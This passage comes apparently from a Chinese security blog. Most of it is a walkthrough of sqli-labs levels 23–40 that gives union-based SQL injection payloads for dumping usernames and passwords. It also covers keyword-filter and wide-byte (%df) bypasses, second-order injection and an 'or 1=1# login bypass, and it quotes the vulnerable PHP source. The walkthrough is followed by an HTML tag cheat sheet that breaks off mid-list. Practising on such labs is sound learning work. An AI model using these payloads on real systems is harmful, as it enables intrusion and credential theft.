class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码看似简单粗暴，但是它过滤了注释符，对我们接下来的操作造成短暂的不便，那怎么样才能绕过呢？这是一个关键的问题，我们用注释是为了达到闭合的效果，所以这里只需要改变一下查询语句的闭合位置。<br>测试：<br>输入?id&#x3D;1’ 报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-adb31fe7a74e9f90.png" alt="image.png"><br>根据报错提示，发现注入参数是在一对单引号中。<br>注入语句：<br><code>id=0&#39;  union select 1,1,database() #</code><br>不显示。<br>找闭合点：<br>?id&#x3D;1’ union select  ‘1<br>?id&#x3D;1’ union select  1 , ‘1<br>?id&#x3D;1’ union select  1 , 1 ,’1<br>发现前来个都会报错，而最后一个不报错，说明当前查询表的列数是三列。<br>爆库<br><code>?id=0&#39; union select 1,database(),&#39;1</code><br>爆表<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;1</code><br>爆列<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;1</code><br>爆值<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(username,password) from users),&#39;1</code></p><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>利用带有管理员账号的注册用户名，在修改密码的时候达到修改管理员账号密码的效果即可<br>注册用户名：admin’ or ‘1’&#x3D;’1  密码为 admin<br>注册成功后，登录进去修改密码，将密码改为 123<br>更改后即可发现，admin用户的密码也被改成了123，<br><code>update tables set password=’123’ where username=’admin’ or ‘1’=’1’</code></p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>过滤了or和and<br>故这里的and 用&amp;&amp;，anandd代替<br>or用||，oorr代替<br>注入id&#x3D;1’,报错，根据报错提示发现注入参数被一对单引号包裹<br>测试：<br>?id&#x3D;0’ union select 1,1,’1<br>测试成功。<br>爆库：<br><code>?id=0&#39; union select 1,database(),&#39;3</code><br>爆表：<br><code>?id=0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;3</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-b0d8a5f4b5f7ab32.png" alt="图片.png"><br>发现爆错原来information中【or】被过滤了，只需把information改成infoorrmation即可<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bee70e0275edf96f.png" alt="图片.png"><br>爆列：<br><code>?id=0&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),&#39;3</code><br>爆值：<br><code>?id=0&#39; union select 1,(select group_concat(username,password) from users,&#39;3</code></p><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-34ab949cb3691b09.png" alt="图片.png"><br>简单试了一下，过滤了所有空白字符，看了一下源码，发现过滤的还不少，想要绕过,难度有点大，听说注释法很管用&#x2F;**&#x2F;或者%0a，但是试了一下都不行。。。</p><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>看图标发现union,select，空格都被过滤了，所以想办法绕过：<br>1.双写，发现不行(unionunion selectselect)<br>2.大小写，测试通过(unIon%0ASelEcT%0A)<br>3.将以上两种结合，测试通过(UNionUNION%0ASeLectselect)<br>注入：<br>爆库：<br><code>?id=0&#39; UNionUNION%0ASeLectselect%0A1,database(),&#39;1</code><br>爆表：<br><code>?id=0&#39; UNionUNION%0ASeLectselect%0A1,(seLect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;),&#39;1</code><br>爆值：<br><code>?id=0&#39;%0AUNionUNION%0ASeLectselect%0A1,(SeLectselect%0Agroup_concat(username,password)%0Afrom%0Ausers),&#39;1</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-83f98985a93b4709.png" alt="图片.png"></p><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>这关没有错误回显，所以只能试，<br>测试;<br>?id&#x3D;1,注入成功。<br>?id&#x3D;1’,不显示。<br>?id&#x3D;1”,注入成功。<br>说明它不单单只有单引号这么简单，猜测它是?id&#x3D;1’) ,注入成功。<br>注入：<br>与前面思路一致，只需绕过union+select<br>爆库：<br><code>?id=0&#39;)%0Aunionunion%0ASElect%0Aselect%0A1,database(),(&#39;1</code></p><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p>这道题简单测试一下恢复正常，单引号注入，详细过程同上。</p><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>简单的测试发现不报错，也不显示，测试后发现注入1或者1’则成功，说明很可能在一对双引号里<br>注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-31</span><br><span class="line"></span><br><span class="line">输入?id=1&quot;</span><br><span class="line">![图片.png](https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-2476c269b2318b76.png)</span><br><span class="line">根据报错提示，我们只需在【&quot;】后添加【)】即可</span><br><span class="line">注入:</span><br><span class="line">稍作改动，同之前。</span><br><span class="line"></span><br><span class="line">## less-32</span><br><span class="line"></span><br><span class="line">发现注入1，1‘，1“，这些都对</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>function check_addslashes($string)<br>{<br>$string &#x3D; preg_replace(‘&#x2F;‘. preg_quote(‘\‘) .’&#x2F;‘, “\\\“, $string); &#x2F;&#x2F;escape any backslash<br>$string &#x3D; preg_replace(‘&#x2F;&#39;&#x2F;i’, ‘\&#39;‘, $string); &#x2F;&#x2F;escape single quote with a backslash<br> $string &#x3D; preg_replace(‘&#x2F;&quot;&#x2F;‘, “\&quot;“, $string); &#x2F;&#x2F;escape double quote with a backslash<br>return $string;<br>}<br>$id&#x3D;check_addslashes($_GET[‘id’]);<br> $sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”; $result&#x3D;mysql_query($sql);<br>$row &#x3D; mysql_fetch_array($result);<br> if($row)<br>{<br>echo ‘Your Login name:’. $row[‘username’];<br>echo ‘Your Password:’ .$row[‘password’];<br>}else{<br> print_r(mysql_error());<br> }</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 这里说一下宽字节绕过，因为下面几道题都是</span><br><span class="line"></span><br><span class="line">### 原理</span><br><span class="line"></span><br><span class="line">&gt;mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤’ 的时候，往往利用的思路是将’ 转换为\’ （转换的函数或者思路会在每一关遇到的时候介绍）。</span><br><span class="line">&gt;%df 吃掉 \ 具体的原因是 urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line">&gt;将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的 %5c 会被前面的 %5c 给注释掉。这也是bypass 的一种方法。</span><br><span class="line"></span><br><span class="line">### 注入思路</span><br><span class="line"></span><br><span class="line">&gt;将’ 前面添加的\ 除掉，一般有两种思路：</span><br><span class="line">&gt;urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line"></span><br><span class="line">所以根据以上不难判断出,payload:</span><br><span class="line">```?id=0%df&#x27; union select 1,1,database() --+```</span><br><span class="line"></span><br><span class="line">## less-33</span><br><span class="line"></span><br><span class="line">同less-32</span><br><span class="line">payload:```?id=0%df%27%20union%20select%201,1,1%20--+```</span><br><span class="line"></span><br><span class="line">## less-34</span><br><span class="line"></span><br><span class="line">### 原理</span><br><span class="line"></span><br><span class="line">&gt;本关是 post 型的注入漏洞，同样的也是将post 过来的内容进行了 ‘\’ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的 \ 给吃掉。而 get 型的方式我们是以 url 形式提交的，因此数据会通过URLencode，如何将方法用在 post 型的注入当中，我们此处介绍一个新的方法。</span><br><span class="line">&gt;将 utf-8 转换为 utf-16 或 utf-32，例如将 ’ 转为 utf-16 为 %EF%BF%BD% 。我们就可以利用这个方式进行尝试。</span><br><span class="line">&gt;POST型 这里使用万能账号</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">uname:&#x27;or 1=1#</span><br><span class="line">password: 任意</span><br></pre></td></tr></table></figure><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>输入id&#x3D;1’,报错<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7a56fa0d5c5b09b5.png" alt="图片.png"><br>根据报错发现没用单引号,id 没有被 ’ 符号包括起来，那我们就没有必要去考虑check_addslashes() 函数的意义了<br>爆库:<br><code>?id=0 union select 1,1,database() --+</code><br>爆表：<br><code>?id=0 union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code><br>爆值:<br><code>?id=0 union select 1,group_concat(username),group_concat(password) from security.users where 1 #</code></p><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>爆库：<br><code>?id=0%df%27%20union%20select%201,1,database()--+</code><br>爆表：<br><code>?id=0%df%27%20union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()--+</code><br>爆值：<br><code>?id=0%df&#39; union select 1,group_concat(username),group_concat(password) from security.users where 1 #</code></p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>POST型 这里使用万能账号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="string">&#x27;or 1=1#</span></span><br><span class="line"><span class="string">password: 任意</span></span><br></pre></td></tr></table></figure><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>爆库：<br><code>?id=0&#39; union select 1,1,database()--+</code><br>爆表：<br><code>?id=0&#39; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>爆库：<br><code>?id=0 union select 1,1,database()--+</code><br>同38只不过变为?id&#x3D;0去掉单引号</p><h2 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h2><p>注入1，1”都对，但是1‘不对，也不回显，故根据经验我猜测是’)。<br>测试：<br><code>?id=0&#39;) union select 1,1,1--+</code><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-deae43640aa8391b.png" alt="图片.png"><br>爆库：<br><code>?id=0&#39;) union select 1,1,1--+</code><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a7be2e07f66c94d1.png" alt="图片.png"><br>同上只是id&#x3D;0变为id&#x3D;0’)加上单引号和括号。</p><h2 id="附有用"><a href="#附有用" class="headerlink" title="附有用"></a>附有用</h2><p><a href="https://blog.csdn.net/Kevinhanser/article/details/81563451">sqli-labs宽字节注入题目深入学习</a><br><a href="https://encoder.mattiasgeniar.be/index.php">Decoder - Encoder</a><br><a href="https://www.freebuf.com/articles/web/36683.html">见到WAF不害怕，注入绕过</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML Quick Reference Notes</title>
      <link href="/2019/01/19/HTML-Quick-Reference-Notes/"/>
      <url>/2019/01/19/HTML-Quick-Reference-Notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-19afe47c8345a317.png" alt="image"></p><h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><h1 id="HTML-速查列表"><a href="#HTML-速查列表" class="headerlink" title="HTML 速查列表"></a>HTML 速查列表</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;文档标题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;可见文本...&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="基本标签（Basic-Tags）"><a href="#基本标签（Basic-Tags）" class="headerlink" title="基本标签（Basic Tags）"></a>基本标签（Basic Tags）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;最大的标题&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt; . . . &lt;/h2&gt;</span><br><span class="line">&lt;h3&gt; . . . &lt;/h3&gt;</span><br><span class="line">&lt;h4&gt; . . . &lt;/h4&gt;</span><br><span class="line">&lt;h5&gt; . . . &lt;/h5&gt;</span><br><span class="line">&lt;h6&gt;最小的标题&lt;/h6&gt;</span><br><span class="line">&lt;p&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;br&gt; （换行）</span><br><span class="line">&lt;hr&gt; （水平线）</span><br><span class="line">&lt;!-- 这是注释 --&gt;</span><br></pre></td></tr></table></figure><h4 id="文本格式化（Formatting）"><a href="#文本格式化（Formatting）" class="headerlink" title="文本格式化（Formatting）"></a>文本格式化（Formatting）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;粗体文本&lt;/b&gt;</span><br><span class="line">&lt;code&gt;计算机代码&lt;/code&gt;</span><br><span class="line">&lt;em&gt;强调文本&lt;/em&gt;</span><br><span class="line">&lt;i&gt;斜体文本&lt;/i&gt;</span><br><span class="line">&lt;kbd&gt;键盘输入&lt;/kbd&gt;</span><br><span class="line">&lt;pre&gt;预格式化文本&lt;/pre&gt;</span><br><span class="line">&lt;small&gt;更小的文本&lt;/small&gt;</span><br><span class="line">&lt;strong&gt;重要的文本&lt;/strong&gt;</span><br><span class="line">&lt;abbr&gt; （缩写）</span><br><span class="line">&lt;address&gt; （联系信息）</span><br><span class="line">&lt;bdo&gt; （文字方向）</span><br><span class="line">&lt;blockquote&gt; （从另一个源引用的部分）</span><br><span class="line">&lt;cite&gt; （工作的名称）</span><br><span class="line">&lt;del&gt; （删除的文本）</span><br><span class="line">&lt;ins&gt; （插入的文本）</span><br><span class="line">&lt;sub&gt; （下标文本）</span><br><span class="line">&lt;sup&gt; （上标文本）</span><br></pre></td></tr></table></figure><h3 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h3><hr><h4 id="普通的链接"><a href="#普通的链接" class="headerlink" title="普通的链接"></a>普通的链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.example.com/&quot;&gt;链接文本&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="图像链接"><a href="#图像链接" class="headerlink" title="图像链接"></a>图像链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.example.com/&quot;&gt;&lt;img src=&quot;URL&quot; alt=&quot;替换文本&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="邮件链接"><a href="#邮件链接" class="headerlink" title="邮件链接"></a>邮件链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;mailto:webmaster@example.com&quot;&gt;发送e-mail&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;tips&quot;&gt;提示部分&lt;/a&gt;&lt;a href=&quot;#tips&quot;&gt;跳到提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="图片（Images）"><a href="#图片（Images）" class="headerlink" title="图片（Images）"></a>图片（Images）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;URL&quot; alt=&quot;替换文本&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="样式-区块（Styles-Sections）"><a href="#样式-区块（Styles-Sections）" class="headerlink" title="样式&#x2F;区块（Styles&#x2F;Sections）"></a>样式&#x2F;区块（Styles&#x2F;Sections）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"></span><br><span class="line">h1</span><br><span class="line">&#123;</span><br><span class="line">color:red;</span><br><span class="line">&#125;</span><br><span class="line">p </span><br><span class="line">&#123;</span><br><span class="line">color:blue;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;&lt;div&gt;文档中的块级元素&lt;/div&gt;</span><br><span class="line">&lt;span&gt;文档中的内联元素&lt;/span&gt;</span><br></pre></td></tr></table></figure><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;   </span><br><span class="line"> &lt;li&gt;项目&lt;/li&gt;   </span><br><span class="line"> &lt;li&gt;项目&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;   </span><br><span class="line"> &lt;li&gt;第一项&lt;/li&gt;    </span><br><span class="line">&lt;li&gt;第二项&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><h4 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt; </span><br><span class="line"> &lt;dt&gt;项目 1&lt;/dt&gt;   </span><br><span class="line"> &lt;dd&gt;描述项目 1&lt;/dd&gt; </span><br><span class="line"> &lt;dt&gt;项目 2&lt;/dt&gt;    </span><br><span class="line">&lt;dd&gt;描述项目 2&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure><h4 id="表格（Tables）"><a href="#表格（Tables）" class="headerlink" title="表格（Tables）"></a>表格（Tables）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot;&gt; </span><br><span class="line"> &lt;tr&gt;    </span><br><span class="line">&lt;th&gt;表格标题&lt;/th&gt;   </span><br><span class="line">&lt;th&gt;表格标题&lt;/th&gt;  </span><br><span class="line">&lt;/tr&gt;  </span><br><span class="line">&lt;tr&gt;  </span><br><span class="line">&lt;td&gt;表格数据&lt;/td&gt;    </span><br><span class="line">&lt;td&gt;表格数据&lt;/td&gt; </span><br><span class="line"> &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="框架（Iframe）"><a href="#框架（Iframe）" class="headerlink" title="框架（Iframe）"></a>框架（Iframe）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;demo_iframe.htm&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h4 id="表单（Forms）"><a href="#表单（Forms）" class="headerlink" title="表单（Forms）"></a>表单（Forms）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;demo_form.php&quot; method=&quot;post/get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; maxlength=&quot;50&quot;&gt;</span><br><span class="line">&lt;input type=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;radio&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Send&quot;&gt;</span><br><span class="line">&lt;input type=&quot;reset&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;苹果&lt;/option&gt;</span><br><span class="line">&lt;option selected=&quot;selected&quot;&gt;香蕉&lt;/option&gt;</span><br><span class="line">&lt;option&gt;樱桃&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;textarea name=&quot;comment&quot; rows=&quot;60&quot; cols=&quot;20&quot;&gt;</span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line"> &lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="实体（Entities）"><a href="#实体（Entities）" class="headerlink" title="实体（Entities）"></a>实体（Entities）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt; 等同于 &lt;&amp;gt; 等同于 &gt;&amp;#169; 等同于 ©</span><br></pre></td></tr></table></figure><h1 id="HTML标签合集-附学习地址"><a href="#HTML标签合集-附学习地址" class="headerlink" title="HTML标签合集(附学习地址)"></a>HTML标签合集(附学习地址)</h1><pre><code>&lt;!--...--&gt;| 定义注释 |&lt;!DOCTYPE&gt;| 定义文档类型 |&lt;a&gt;(http://www.runoob.com/tags/tag-a.html) | 定义超文本链接 |&lt;abbr&gt;(http://www.runoob.com/tags/tag-abbr.html) | 定义缩写 |&lt;acronym&gt;(http://www.runoob.com/tags/tag-acronym.html)| 定义只取首字母的缩写，不支持HTML5 |&lt;address&gt;(http://www.runoob.com/tags/tag-address.html) | 定义文档作者或拥有者的联系信息 |&lt;applet&gt;(http://www.runoob.com/tags/tag-applet.html) | HTML5中不赞成使用。定义嵌入的 applet。 |&lt;area&gt;(http://www.runoob.com/tags/tag-area.html) | 定义图像映射内部的区域 |&lt;article&gt;(http://www.runoob.com/tags/tag-article.html)| 定义一个文章区域 |&lt;aside&gt;(http://www.runoob.com/tags/tag-aside.html)| 定义页面的侧边栏内容 |&lt;audio&gt;(http://www.runoob.com/tags/tag-audio.html)| 定义音频内容 |&lt;b&gt;(http://www.runoob.com/tags/tag-b.html) | 定义文本粗体 |&lt;base&gt;(http://www.runoob.com/tags/tag-base.html) | 定义页面中所有链接的默认地址或默认目标.|&lt;basefont&gt;(http://www.runoob.com/tags/tag-basefont.html) | HTML5不支持，不赞成使用。定义页面中文本的默认字体、颜色或尺寸. |&lt;bdi&gt;(http://www.runoob.com/tags/tag-bdi.html) | 允许您设置一段文本，使其脱离其父元素的文本方向设置.|&lt;bdo&gt;(http://www.runoob.com/tags/tag-bdo.html) | 定义文字方向 |&lt;big&gt;(http://www.runoob.com/tags/tag-big.html) | 定义大号文本，HTML5不支持 |&lt;blockquote&gt;(http://www.runoob.com/tags/tag-blockquote.html) | 定义长的引用 |&lt;body&gt;(http://www.runoob.com/tags/tag-body.html) | 定义文档的主体 |&lt;br&gt;(http://www.runoob.com/tags/tag-br.html) | 定义换行 |&lt;button&gt;(http://www.runoob.com/tags/tag-button.html) | 定义一个点击按钮 |&lt;canvas&gt;(http://www.runoob.com/tags/tag-canvas.html) | 定义图形，比如图表和其他图像,标签只是图形容器，您必须使用脚本来绘制图形 |&lt;caption&gt;(http://www.runoob.com/tags/tag-caption.html) | 定义表格标题 |&lt;center&gt;(http://www.runoob.com/tags/tag-center.html) | HTML5不支持，不赞成使用。定义居中文本。 |&lt;cite&gt;(http://www.runoob.com/tags/tag-cite.html) | 定义引用(citation) |&lt;code&gt;(http://www.runoob.com/tags/tag-code.html) | 定义计算机代码文本 |&lt;col&gt;(http://www.runoob.com/tags/tag-col.html) | 定义表格中一个或多个列的属性值 |&lt;colgroup&gt;(http://www.runoob.com/tags/tag-colgroup.html) | 定义表格中供格式化的列组 |&lt;command&gt;(http://www.runoob.com/tags/tag-command.html)| 定义命令按钮，比如单选按钮、复选框或按钮 |&lt;datalist&gt;(http://www.runoob.com/tags/tag-datalist.html) | 定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值. |&lt;dd&gt;(http://www.runoob.com/tags/tag-dd.html) | 定义定义列表中项目的描述 |&lt;del&gt;(http://www.runoob.com/tags/tag-del.html) | 定义被删除文本 |&lt;details&gt;(http://www.runoob.com/tags/tag-details.html) | 用于描述文档或文档某个部分的细节 |&lt;dfn&gt;(http://www.runoob.com/tags/tag-dfn.html) | 定义定义项目 |&lt;dialog&gt;(http://www.runoob.com/tags/tag-dialog.html)| 定义对话框，比如提示框 |&lt;dir&gt;(http://www.runoob.com/tags/tag-dir.html) | HTML5不支持，不赞成使用。定义目录列表。 |&lt;div&gt;(http://www.runoob.com/tags/tag-div.html) | 定义文档中的节 |&lt;dl&gt;(http://www.runoob.com/tags/tag-dl.html) | 定义列表详情 